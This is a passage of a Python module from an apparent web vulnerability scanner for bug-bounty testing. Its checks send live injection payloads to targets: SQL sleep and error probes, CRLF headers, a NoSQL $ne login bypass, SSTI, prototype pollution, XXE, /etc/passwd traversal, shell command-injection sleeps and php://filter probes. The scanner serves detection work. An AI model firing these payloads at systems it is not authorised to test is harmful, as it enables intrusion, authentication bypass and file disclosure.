"""
Injection-class checks: SQLi, SSTI, XXE, LDAP/XPath injection, command
injection, prototype pollution, NoSQL injection, LFI/path traversal,
insecure deserialization, CRLF/host-header/param-pollution style bugs.

Split out of the original monolithic detective.py - see detective/__init__.py
for the package-level docstring and full batch history.
"""

import asyncio
import base64
import hashlib
import hmac
import ipaddress
import json
import logging
import math
import os
import random
import re
import ssl
import struct
import time
import uuid
from collections import Counter
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from .. import oob, secret_verifier
from .shared import (
    logger,
    _TIMEOUT,
    _MAX_REASONABLE_URL_LENGTH,
    _extract_hostname,
    _looks_like_sane_url,
    _shannon_entropy,
    _replace_query_param,
    get_transport,
    _WAF_CHALLENGE_PATH_HINTS,
)

_SQLI_DELAY_SECONDS = 6
_SQLI_TIMING_PAYLOADS = [
    "' OR (SELECT 1 FROM (SELECT(SLEEP({delay})))x) OR '",  # MySQL, generic polyglot
    "'||pg_sleep({delay})--",                                  # PostgreSQL
]
_SQLI_CONTROL_PAYLOAD = "' OR (SELECT 1 FROM (SELECT(SLEEP(0)))x) OR '"

# Only worth testing params on URLs that actually have a query string -
# no query string means nothing to inject into.
_MAX_PARAMS_PER_URL = 2


async def check_blind_sqli_timing(url: str) -> dict | None:
    """
    Tests each query parameter on `url` with a quiet SLEEP()-based timing
    payload. If the response takes noticeably longer than baseline AND a
    zero-delay control request on the SAME parameter returns to normal
    speed, that's strong evidence of a real, exploitable SQL injection -
    ordinary network slowness would affect the control request too.

    Capped to the first 2 query parameters per URL to keep this fast;
    each full test costs ~3 requests (baseline, delayed, control), one
    of which deliberately takes _SQLI_DELAY_SECONDS to complete.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None

    logger.info("detective: checking blind SQLi timing for %s", url)
    param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]

    try:
        client = httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), transport=get_transport())
        t0_start = time.monotonic()
        await client.get(url)
        baseline = time.monotonic() - t0_start

        for param in param_names:
            for payload_template in _SQLI_TIMING_PAYLOADS:
                payload = payload_template.format(delay=_SQLI_DELAY_SECONDS)
                mutated = _replace_query_param(parsed, query_params, param, payload)

                t1_start = time.monotonic()
                try:
                    await client.get(mutated)
                except httpx.TimeoutException:
                    pass  # a timeout on the delayed request is itself a data point
                elapsed_delayed = time.monotonic() - t1_start

                if elapsed_delayed < baseline + (_SQLI_DELAY_SECONDS - 1.0):
                    continue  # not slow enough to be the injected delay - try next payload

                # Confirm with a same-parameter, zero-delay control -
                # if this also comes back slow, it's network jitter,
                # not the database honoring our SLEEP().
                control_url = _replace_query_param(
                    parsed, query_params, param, _SQLI_CONTROL_PAYLOAD
                )
                t2_start = time.monotonic()
                await client.get(control_url)
                elapsed_control = time.monotonic() - t2_start

                if elapsed_control < baseline + 2.0:
                    return {
                        "vuln_type": "blind_sql_injection",
                        "severity": "critical",
                        "evidence": (
                            f"{url} param '{param}': baseline={baseline:.1f}s, "
                            f"SLEEP({_SQLI_DELAY_SECONDS}) payload={elapsed_delayed:.1f}s, "
                            f"zero-delay control={elapsed_control:.1f}s. Timing consistently "
                            f"follows the injected delay - confirmed blind SQL injection."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: blind SQLi timing check failed for %s: %s", url, exc)
    return None


_CRLF_MARKER = "swas_crlf_probe"
_CRLF_PAYLOAD = f"test%0d%0aSet-Cookie:%20{_CRLF_MARKER}=1"


def _inject_raw_query_param(url: str, param: str, raw_value: str) -> str:
    """
    Like _replace_query_param, but inserts `raw_value` into the query
    string verbatim instead of running it through urlencode(). This
    matters specifically for CRLF payloads: urlencode() would re-encode
    our already-percent-encoded %0d%0a into %250d%250a, which never
    reaches the server as an actual CR/LF once it decodes the URL - the
    payload would just silently stop working.
    """
    parsed = urlparse(url)
    parts = parsed.query.split("&") if parsed.query else []
    new_parts, replaced = [], False
    for part in parts:
        key = part.split("=", 1)[0]
        if key == param:
            new_parts.append(f"{param}={raw_value}")
            replaced = True
        else:
            new_parts.append(part)
    if not replaced:
        new_parts.append(f"{param}={raw_value}")
    return urlunparse(parsed._replace(query="&".join(new_parts)))


def _evaluate_crlf_response(resp: "httpx.Response", baseline_header_names: set[str]) -> dict | None:
    """
    v2 (2026-07-23, false-positive review from manual bounty triage on
    verilyme.com/Vercel and shop.whoop.com/Cloudflare - see triage notes):

    The old bar was "marker substring appears anywhere in any header
    VALUE". That's necessary but NOT sufficient, and it produced two
    confirmed false positives. Both targets sit behind a modern edge/CDN
    (Vercel, Cloudflare) that reflected the raw payload back as INERT
    text embedded inside an *existing* header's value - almost always the
    Location header's URL, since both test cases were redirect-heavy -
    or re-encoded it (%0D%0A) before it ever reached header-writing
    logic. Neither case produced a genuinely new, structurally
    independent header line, which is the actual definition of response
    splitting.

    New confirmation bar, all of which must hold:
      1. Compare against a baseline (unmutated) request's header NAMES.
         The response to the injected request must contain a header name
         that did NOT exist in the baseline - i.e. the server emitted an
         extra header line, not just new text inside a header it always
         sends (like Location).
      2. That new header's value must contain the marker.
      3. The marker must not also appear anywhere re-encoded
         (%0d%0a / %250d%250a) - that's the signature of an edge layer
         actively sanitizing the input, which rules out exploitability
         even if some other check looked promising.
    """
    for v in resp.headers.values():
        lowered = v.lower()
        if "%0d%0a" in lowered or "%250d%250a" in lowered:
            return None

    response_header_names = {k.lower() for k in resp.headers.keys()}
    new_header_names = response_header_names - baseline_header_names

    for name in new_header_names:
        for value in resp.headers.get_list(name):
            if _CRLF_MARKER in value:
                return {
                    "vuln_type": "crlf_injection",
                    "severity": "medium",
                    "evidence": (
                        f"injecting a CRLF sequence produced a genuinely new response header "
                        f"('{name}: {value}') absent from the baseline (unmutated) response - "
                        f"confirmed HTTP response splitting, not a substring reflected inside an "
                        f"existing header's value (e.g. Location) or the body."
                    ),
                }
    return None


async def check_crlf_injection(url: str) -> dict | None:
    """
    Injects a CRLF sequence + a marker Set-Cookie into each of the
    first 2 query parameters on `url`. Confirmation requires the marker
    to land in a genuinely new response header line relative to a
    baseline request - see `_evaluate_crlf_response` for why a plain
    substring match on header values was dropped (two confirmed false
    positives on edge/CDN-fronted targets).
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None

    param_names = list(query_params.keys())[:2]
    logger.info("detective: checking CRLF injection for %s", url)
    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, transport=get_transport())
        try:
            baseline_resp = await client.get(url)
            baseline_header_names = {k.lower() for k in baseline_resp.headers.keys()}
        except httpx.HTTPError:
            # No baseline available - fall back to "no pre-existing headers",
            # which is stricter (more headers count as "new") rather than
            # silently skipping the check.
            baseline_header_names = set()

        for param in param_names:
            mutated = _inject_raw_query_param(url, param, _CRLF_PAYLOAD)
            try:
                resp = await client.get(mutated)
            except httpx.HTTPError:
                continue

            finding = _evaluate_crlf_response(resp, baseline_header_names)
            if finding:
                finding["evidence"] = f"{url} param '{param}': " + finding["evidence"]
                return finding
    except httpx.HTTPError as exc:
        logger.info("detective: CRLF injection check failed for %s: %s", url, exc)
    return None


_LOGIN_CANDIDATE_PATHS = ["/api/login", "/login", "/api/auth/login", "/api/session", "/signin", "/api/signin"]
_LOGIN_FIELD_COMBOS = [("username", "password"), ("email", "password")]


async def _check_login_bypass(
    client: httpx.AsyncClient, url: str, user_field: str, pass_field: str, payload_body: dict
) -> dict | None:
    """
    Shared confirmation logic for both the NoSQL injection and JSON
    type confusion checks below. Returns a dict with 'baseline_status',
    'payload_status', and 'bypassed' (bool) - the caller fills in its
    own vuln_type/evidence wording since the two checks describe
    different techniques even though the confirmation logic is
    identical.
    """
    baseline_body = {user_field: "swas-probe-nonexistent-user", pass_field: "swas-probe-wrong-password"}
    try:
        baseline_resp = await client.post(url, json=baseline_body)
    except httpx.HTTPError:
        return None
    if baseline_resp.status_code == 404:
        return None  # this path doesn't exist at all on this host

    try:
        payload_resp = await client.post(url, json=payload_body)
    except httpx.HTTPError:
        return None

    baseline_has_cookie = "set-cookie" in baseline_resp.headers
    payload_has_cookie = "set-cookie" in payload_resp.headers
    status_improved = (
        payload_resp.status_code in (200, 201, 302)
        and baseline_resp.status_code not in (200, 201, 302)
    )
    bypassed = payload_has_cookie and not baseline_has_cookie and status_improved
    return {
        "baseline_status": baseline_resp.status_code,
        "payload_status": payload_resp.status_code,
        "bypassed": bypassed,
    }


async def check_blind_nosql_injection(host: str) -> dict | None:
    """
    Tries a short list of common login-endpoint paths with a MongoDB-
    style operator payload ({field: {"$ne": null}}) in place of real
    credentials. No test account is needed here - a successful bypass
    IS the account access being demonstrated. See _check_login_bypass
    for the baseline-comparison logic that avoids false positives from
    apps that just return 200 for everything.
    """
    base = host.rstrip("/")
    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, transport=get_transport())
        for path in _LOGIN_CANDIDATE_PATHS:
            url = base + path
            for user_field, pass_field in _LOGIN_FIELD_COMBOS:
                logger.info("detective: checking blind NoSQL injection for %s", url)
                payload_body = {user_field: {"$ne": None}, pass_field: {"$ne": None}}
                result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
                if result is None:
                    continue
                if result["bypassed"]:
                    return {
                        "vuln_type": "blind_nosql_injection",
                        "severity": "critical",
                        "evidence": (
                            f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
                            f"with no session cookie, but the NoSQL operator payload "
                            f"{{'{user_field}': {{'$ne': null}}, '{pass_field}': {{'$ne': null}}}} "
                            f"returned HTTP {result['payload_status']} WITH a session cookie set - "
                            f"authentication bypass via NoSQL operator injection."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: blind NoSQL injection check failed for %s: %s", host, exc)
    return None


_TYPE_CONFUSION_VARIANTS: list[tuple[str, object]] = [
    ("array_pollution", ["swas-probe-1", "swas-probe-2"]),
    ("boolean_substitution", True),
    ("integer_overflow", 99999999999),
]


async def check_json_type_confusion(host: str) -> dict | None:
    """
    Same candidate paths and confirmation logic as the NoSQL check, but
    the payload substitutes the credential field's TYPE instead of its
    value - an array, a bare boolean, or an oversized integer where the
    backend expects a string. Some JSON parsers (particularly loosely-
    typed ORMs) silently coerce or short-circuit on an unexpected type
    instead of rejecting it, which can skip a string-comparison auth
    check entirely.
    """
    base = host.rstrip("/")
    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, transport=get_transport())
        for path in _LOGIN_CANDIDATE_PATHS:
            url = base + path
            for user_field, pass_field in _LOGIN_FIELD_COMBOS:
                for variant_name, variant_value in _TYPE_CONFUSION_VARIANTS:
                    logger.info(
                        "detective: checking JSON type confusion (%s) for %s", variant_name, url
                    )
                    payload_body = {user_field: variant_value, pass_field: variant_value}
                    result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
                    if result is None:
                        continue
                    if result["bypassed"]:
                        return {
                            "vuln_type": "json_type_confusion",
                            "severity": "critical",
                            "evidence": (
                                f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
                                f"with no session cookie, but substituting field types "
                                f"('{variant_name}': {user_field}={variant_value!r}) returned HTTP "
                                f"{result['payload_status']} WITH a session cookie set - the backend "
                                f"appears to mishandle an unexpected JSON type on the auth check."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: JSON type confusion check failed for %s: %s", host, exc)
    return None


async def check_http_param_pollution(url: str) -> str | None:
    """
    Duplicates the first query parameter on `url` with a second, clearly
    different value, and compares the response to a clean baseline
    request. A status or meaningfully-sized body difference means the
    frontend/backend (or two backend layers, e.g. a CDN and the origin)
    parse duplicate parameters differently - a real signal worth
    pointing manual testing at. Returns a plain string (or None), NOT a
    findings dict: parameter pollution proves a parsing inconsistency
    exists, not that anything is actually bypassable. Confirming a real
    admin-bypass via HPP needs a privileged session to compare against,
    which this project doesn't have test accounts for yet - filing this
    as a standalone finding today would be reporting a parsing quirk,
    not a vulnerability.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None

    param = next(iter(query_params))
    polluted_query = f"{parsed.query}&{param}=swas-hpp-probe-2"
    polluted_url = urlunparse(parsed._replace(query=polluted_query))

    logger.info("detective: checking HTTP parameter pollution for %s", url)
    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, transport=get_transport())
        baseline = await client.get(url)
        polluted = await client.get(polluted_url)
    except httpx.HTTPError:
        return None

    status_changed = baseline.status_code != polluted.status_code
    len_baseline, len_polluted = len(baseline.text), len(polluted.text)
    body_changed = len_baseline > 0 and abs(len_polluted - len_baseline) / len_baseline > 0.05

    if status_changed or body_changed:
        return (
            f"{url}: duplicating param '{param}' changed server behavior "
            f"(status {baseline.status_code}->{polluted.status_code}, body length "
            f"{len_baseline}->{len_polluted}) - possible backend/frontend parsing "
            f"mismatch, worth manual testing with a privileged session for admin-bypass impact"
        )
    return None


async def check_host_header_injection(url: str) -> dict | None:
    """
    Sends a distinctive, attacker-controlled value in the Host header (and
    X-Forwarded-Host, since many apps trust that over Host behind a proxy)
    and checks whether it's reflected unsanitized into the response body
    or into a redirect Location header.

    Reflection is the proof bar here, not just "the request succeeded" -
    a server that reflects the poisoned host is a real password-reset-
    poisoning / cache-poisoning candidate; one that ignores it isn't a
    finding at all, so this stays quiet unless the marker comes back.
    """
    marker = "swas-hhi-probe.invalid"
    parsed = httpx.URL(url)
    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=False)
        resp = await client.get(
            url,
            headers={"Host": marker, "X-Forwarded-Host": marker},
        )
    except httpx.HTTPError as exc:
        logger.info("detective: host header injection check failed for %s: %s", url, exc)
        return None

    location = resp.headers.get("location", "")
    body_sample = resp.text[:5000]
    if marker in location:
        return {
            "vuln_type": "host_header_injection",
            "severity": "high",
            "evidence": (
                f"{url}: sending Host/X-Forwarded-Host={marker} caused the server to redirect "
                f"to a Location header containing that value ({location}). Likely password-reset "
                f"link poisoning or open-redirect-via-host vector."
            ),
        }
    if marker in body_sample:
        return {
            "vuln_type": "host_header_injection",
            "severity": "medium",
            "evidence": (
                f"{url}: the spoofed Host/X-Forwarded-Host value ({marker}) was reflected "
                f"directly into the response body (e.g. a canonical link, asset URL, or "
                f"absolute-URL generator using the request Host)."
            ),
        }
    _ = parsed  # kept for future scheme/port-aware variants
    return None


def _ssti_probes() -> list[tuple[str, str]]:
    """
    Builds SSTI probes with randomized operands, computed fresh per scan
    rather than the fixed 7*7=49 this shipped with initially. A static
    two-digit result like "49" can trivially appear in a response by
    pure coincidence (a byte count, a CSS value, part of an unrelated
    longer number) with no baseline comparison to rule that out - that
    was a real false-positive bug (see check_ssti's docstring). Using
    two random 2-3 digit operands makes the product effectively unique
    per request, and it's paired with an explicit baseline diff in
    check_ssti itself as defense in depth.
    """
    a = random.randint(37, 97)
    b = random.randint(41, 89)
    product = str(a * b)
    return [
        (f"${{{a}*{b}}}", product),
        (f"#{{{a}*{b}}}", product),
        (f"{{{{{a}*{b}}}}}", product),
        (f"{{{{={a}*{b}}}}}", product),
        (f"<%= {a}*{b} %>", product),
    ]


async def check_ssti(url: str) -> dict | None:
    """
    Appends each SSTI probe as a value on every existing query parameter
    and checks whether the *evaluated* result shows up in the response
    body somewhere the raw payload didn't already appear. This is
    proof-based, not signature-based - a template engine that just
    echoes "{{91*67}}" back verbatim isn't vulnerable, so echoed-but-
    unevaluated payloads are explicitly excluded to avoid false positives
    from any app that reflects input at all (which is most of them).

    Two layers against false positives: (1) operands are randomized per
    scan, so the expected product is different every time and
    effectively unique rather than a common short number like "49" that
    can coincidentally appear anywhere in a page; (2) the expected value
    must be ABSENT from a baseline (unmodified) request to the same URL
    before a match counts - if it's already present without the payload,
    it's coincidence, not evaluation.

    A third layer, added after a real false positive: known WAF/CDN
    challenge endpoints (see _WAF_CHALLENGE_PATH_HINTS) are skipped
    outright. Imperva's own Incapsula bot-challenge script does
    arithmetic transforms on its own tokens as part of how it works -
    that clears both proof layers above legitimately (the math really
    does evaluate, and it's really absent from baseline), because the
    check is sound, it's just pointed at infrastructure instead of the
    application. No baseline/evidence trick can tell those apart from
    the outside; only knowing the endpoint belongs to the WAF can.
    """
    parsed = httpx.URL(url)
    if _WAF_CHALLENGE_PATH_HINTS.search(parsed.path):
        return None
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            for payload, expected in _ssti_probes():
                if expected in baseline_body:
                    continue  # would coincidentally match even unmodified - skip this operand pair
                test_params = dict(existing_params)
                test_params[param_name] = existing_params[param_name] + payload
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text
                if payload in body:
                    continue  # reflected raw, not evaluated - not a finding
                if expected in body:
                    return {
                        "vuln_type": "server_side_template_injection",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: parameter '{param_name}' with payload {payload!r} "
                            f"caused the literal evaluated result {expected!r} to appear in the "
                            f"response body (payload itself not present unevaluated, and "
                            f"{expected!r} was absent from an unmodified baseline request to "
                            f"the same URL), consistent with server-side template injection / RCE."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: SSTI check failed for %s: %s", url, exc)
    return None


async def check_prototype_pollution(url: str) -> dict | None:
    """
    POSTs a small JSON body containing a __proto__ pollution gadget to
    `url` and checks whether the polluted property (a distinctive marker
    key/value) gets reflected back anywhere in the response - on a
    subsequent unrelated GET to the same host, or directly in the POST
    response itself. Only fires on that positive reflection, not on
    "the request was accepted" (which most JSON APIs will do regardless).
    """
    marker_key = "swasPollutedMarker"
    marker_val = "swas-proto-pollution-proof"
    payload = {"__proto__": {marker_key: marker_val}}

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            post_resp = await client.post(url, json=payload)
        except httpx.HTTPError:
            return None

        if marker_val in post_resp.text:
            return {
                "vuln_type": "prototype_pollution",
                "severity": "high",
                "evidence": (
                    f"{url}: POSTing a __proto__ gadget ({payload}) caused the injected "
                    f"marker value {marker_val!r} to be reflected directly in the response."
                ),
            }

        # Second signal: a plain, unrelated GET on the same origin picking up
        # the polluted property would indicate the pollution reached shared/
        # global object state, not just this one request's local object.
        try:
            probe_resp = await client.get(url)
        except httpx.HTTPError:
            return None
        if marker_val in probe_resp.text:
            return {
                "vuln_type": "prototype_pollution",
                "severity": "critical",
                "evidence": (
                    f"{url}: after POSTing a __proto__ gadget, a separate follow-up GET to "
                    f"the same URL also returned the injected marker {marker_val!r}, "
                    f"indicating the pollution affected shared/global state rather than "
                    f"just the one request - broader blast radius."
                ),
            }
    except httpx.HTTPError as exc:
        logger.info("detective: prototype pollution check failed for %s: %s", url, exc)
    return None


_SQLI_ERROR_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"you have an error in your sql syntax", re.IGNORECASE), "MySQL"),
    (re.compile(r"warning: mysqli?_", re.IGNORECASE), "MySQL"),
    (re.compile(r"unterminated quoted string", re.IGNORECASE), "SQLite"),
    (re.compile(r"sqlite3\.OperationalError", re.IGNORECASE), "SQLite"),
    (re.compile(r"pg_query\(\)|PostgreSQL.*ERROR|SQLSTATE\[", re.IGNORECASE), "PostgreSQL"),
    (re.compile(r"ORA-\d{5}", re.IGNORECASE), "Oracle"),
    (re.compile(r"Microsoft OLE DB Provider for SQL Server", re.IGNORECASE), "MSSQL"),
    (re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE), "MSSQL"),
    (re.compile(r"System\.Data\.SqlClient\.SqlException", re.IGNORECASE), "MSSQL"),
]
_SQLI_ERROR_PROBES = ["'", "\"", "')", "\")", "' OR '1'='1"]


async def check_sqli_error_based(url: str) -> dict | None:
    """
    Complements check_blind_sqli_timing (batch 1): instead of a timing
    side-channel, this sends a small set of syntax-breaking probes and
    matches the response against known database error-message
    signatures. Error-based findings are generally higher-confidence and
    easier for a triager to verify than timing-based ones, so this is
    kept as a separate, distinctly-labeled check rather than folded in.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        # Baseline first - some apps always show a DB-flavored error page
        # regardless of input, which would otherwise false-positive every param.
        try:
            baseline = await client.get(url)
        except httpx.HTTPError:
            return None
        baseline_body = baseline.text

        for param_name in existing_params:
            for probe in _SQLI_ERROR_PROBES:
                test_params = dict(existing_params)
                test_params[param_name] = existing_params[param_name] + probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                for pattern, db_type in _SQLI_ERROR_SIGNATURES:
                    if pattern.search(resp.text) and not pattern.search(baseline_body):
                        return {
                            "vuln_type": "sql_injection_error_based",
                            "severity": "critical",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with probe {probe!r} "
                                f"triggered a {db_type} error signature not present in the "
                                f"baseline (unmodified) response."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: error-based SQLi check failed for %s: %s", url, exc)
    return None


_XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///swas-xxe-nonexistent-probe">]>'
    "<root>&xxe;</root>"
)
_XXE_ERROR_SIGNATURES = [
    "no such file", "FileNotFoundException", "ENOENT", "failed to load external entity",
    "cvc-elt", "DOCTYPE is not allowed", "SAXParseException", "XMLSyntaxError",
]


async def check_xxe_error_based(url: str) -> dict | None:
    """
    POSTs a minimal external-entity payload referencing a file path that
    almost certainly doesn't exist, with Content-Type: application/xml.
    This is detection-only, not exfiltration - it never references a
    real, readable file, so there's nothing to leak even if the target
    is vulnerable. A match on an XML-parser-specific error signature
    referencing the entity/file (rather than a generic "bad request")
    is enough to prove the parser attempted external entity resolution,
    which is the vulnerability itself, independent of whether this
    particular probe path exists on disk.

    Baseline-diffed against a plain GET on the same URL first - some of
    these signatures ("no such file", "ENOENT") are generic enough that
    an unrelated 404/error page could already contain them with nothing
    to do with XML at all. Same false-positive lesson as check_ssti.
    """
    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_lower = baseline_resp.text.lower()
        except httpx.HTTPError:
            baseline_lower = ""

        try:
            resp = await client.post(
                url,
                content=_XXE_PAYLOAD,
                headers={"Content-Type": "application/xml"},
            )
        except httpx.HTTPError:
            return None

        body_lower = resp.text.lower()
        for sig in _XXE_ERROR_SIGNATURES:
            sig_lower = sig.lower()
            if sig_lower in body_lower and sig_lower not in baseline_lower:
                return {
                    "vuln_type": "xxe_external_entity_processing",
                    "severity": "high",
                    "evidence": (
                        f"{url}: sending an XML body with an external entity referencing a "
                        f"nonexistent local path triggered a parser error signature "
                        f"({sig!r}, absent from a baseline GET on the same URL), indicating "
                        f"the XML parser attempted to resolve external entities rather than "
                        f"rejecting the DOCTYPE outright."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: XXE check failed for %s: %s", url, exc)
    return None


_DESERIALIZATION_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"^rO0[A-Za-z0-9+/=]+$"), "Java serialized object (base64, starts with rO0)"),
    (re.compile(r"^(a:\d+:\{|O:\d+:\"|s:\d+:\")"), "PHP serialized object"),
    (re.compile(r"^\x80[\x02-\x05]"), "Python pickle protocol marker"),
    (re.compile(r"^AAEAAAD"), ".NET BinaryFormatter (base64)"),
]


async def check_insecure_deserialization_signature(url: str) -> str | None:
    """
    Passively inspects cookie values and query-string values for known
    serialization-format magic-byte/prefix signatures (Java, PHP, Python
    pickle, .NET BinaryFormatter). Returns a plain string, NOT a
    findings dict - same convention as check_idor_candidate and
    check_waf_fingerprint. Spotting a serialized blob proves the app
    deserializes attacker-reachable data, which is a strong RCE
    candidate, but actually confirming exploitability requires building
    and firing a gadget chain specific to whatever's on the classpath/
    installed packages - real exploitation work this scanner isn't
    going to attempt. This just tells you where to point ysoserial (or
    equivalent) by hand.
    """
    parsed = httpx.URL(url)
    candidates: list[str] = list(parsed.params.values())

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: deserialization signature check failed for %s: %s", url, exc)
        return None

    set_cookie = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else [resp.headers.get("set-cookie", "")]
    for raw_cookie in set_cookie:
        if "=" in raw_cookie:
            candidates.append(raw_cookie.split("=", 1)[1].split(";")[0])

    for value in candidates:
        if not value:
            continue
        try:
            decoded_bytes = base64.b64decode(value + "=" * (-len(value) % 4), validate=True)
            decoded_str = value  # keep original for regex on the base64 forms
        except Exception:
            decoded_bytes = b""
            decoded_str = value

        for pattern, label in _DESERIALIZATION_SIGNATURES:
            if pattern.match(decoded_str) or (decoded_bytes and pattern.match(decoded_bytes.decode("latin-1", errors="ignore"))):
                return f"{url}: possible {label} found in a cookie/param value - candidate for manual gadget-chain testing"
    return None


_PATH_TRAVERSAL_PROBES = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
]
# root:x:0:0: is the start of /etc/passwd's first (root) line on every
# Linux distro - about as unique a proof string as exists. [extensions]
# is the start of a genuine win.ini file, for the Windows probe.
_PATH_TRAVERSAL_SIGNATURES = ["root:x:0:0:", "[extensions]", "[fonts]"]


async def check_path_traversal_lfi(url: str) -> dict | None:
    """
    Tries each query parameter with a handful of directory-traversal
    encodings pointed at /etc/passwd (or win.ini for Windows targets),
    and checks for the exact first-line signature of that file. Proof
    bar: the signature must be ABSENT from a baseline (unmodified)
    request first - same discipline as check_sqli_error_based and the
    fixed check_ssti, after that false-positive taught the lesson the
    hard way. root:x:0:0: is about as unlikely to appear coincidentally
    as a string gets, but the baseline check costs one extra request and
    removes any doubt.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
        try:
            baseline_resp = await client.get(url)
            baseline_body = baseline_resp.text
        except httpx.HTTPError:
            return None

        for param_name in existing_params:
            for probe in _PATH_TRAVERSAL_PROBES:
                test_params = dict(existing_params)
                test_params[param_name] = probe
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                for sig in _PATH_TRAVERSAL_SIGNATURES:
                    if sig in resp.text and sig not in baseline_body:
                        return {
                            "vuln_type": "path_traversal_lfi",
                            "severity": "critical",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with traversal probe "
                                f"{probe!r} returned a response containing {sig!r} (absent "
                                f"from the unmodified baseline response) - confirmed local "
                                f"file read."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: path traversal check failed for %s: %s", url, exc)
    return None


_CMDI_DELAY_SECONDS = 6
_CMDI_PAYLOAD_TEMPLATES = [
    ";sleep {delay};",
    "|sleep {delay}|",
    "$(sleep {delay})",
    "`sleep {delay}`",
    "|| ping -n {delay} 127.0.0.1 ||",  # Windows fallback (ping as a delay primitive)
]
_CMDI_CONTROL_TEMPLATE = ";sleep 0;"


async def check_os_command_injection(url: str) -> dict | None:
    """
    Same three-request discipline as check_blind_sqli_timing (baseline,
    delayed payload, zero-delay control on the same parameter) but with
    shell command-chaining payloads instead of SQL. The control request
    is what rules out "the server/network was just slow right then" -
    if the zero-delay version comes back fast while the sleep() version
    doesn't, that's the shell actually executing our injected command,
    not jitter.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None
    param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]

    try:
        client = httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), transport=get_transport())
        t0_start = time.monotonic()
        await client.get(url)
        baseline = time.monotonic() - t0_start

        for param in param_names:
            for payload_template in _CMDI_PAYLOAD_TEMPLATES:
                payload = payload_template.format(delay=_CMDI_DELAY_SECONDS)
                mutated = _replace_query_param(parsed, query_params, param, payload)

                t1_start = time.monotonic()
                try:
                    await client.get(mutated)
                except httpx.TimeoutException:
                    pass
                elapsed_delayed = time.monotonic() - t1_start

                if elapsed_delayed < baseline + (_CMDI_DELAY_SECONDS - 1.0):
                    continue

                control_url = _replace_query_param(
                    parsed, query_params, param, _CMDI_CONTROL_TEMPLATE
                )
                t2_start = time.monotonic()
                await client.get(control_url)
                elapsed_control = time.monotonic() - t2_start

                if elapsed_control < baseline + 2.0:
                    return {
                        "vuln_type": "os_command_injection",
                        "severity": "critical",
                        "evidence": (
                            f"{url} param '{param}': baseline={baseline:.1f}s, "
                            f"payload {payload_template!r} with sleep({_CMDI_DELAY_SECONDS})="
                            f"{elapsed_delayed:.1f}s, zero-delay control={elapsed_control:.1f}s. "
                            f"Timing consistently follows the injected delay - confirmed OS "
                            f"command injection."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: OS command injection check failed for %s: %s", url, exc)
    return None


_PHP_WRAPPER_PROBES = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=config",
]
_PHP_SOURCE_MARKERS = ["<?php", "<?="]


async def check_lfi_via_php_wrapper(url: str) -> dict | None:
    """
